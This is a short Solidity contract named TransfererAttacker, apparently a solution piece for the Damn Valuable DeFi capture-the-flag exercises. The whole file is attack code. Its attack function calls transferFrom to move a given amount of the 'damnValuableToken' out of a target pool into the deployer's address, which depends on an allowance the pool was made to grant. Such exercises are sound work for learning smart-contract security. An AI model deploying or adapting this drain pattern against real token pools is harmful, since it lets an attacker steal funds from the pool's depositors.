pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TransfererAttacker {

    IERC20 public damnValuableToken;
    address public attacker;
    address public pool;

    constructor (address tokenAddress, address _pool) public {
        damnValuableToken = IERC20(tokenAddress);
        attacker = msg.sender;
        pool = _pool;
    }

    function attack (uint amount) public {
        damnValuableToken.transferFrom(pool, attacker, amount);
    }
}
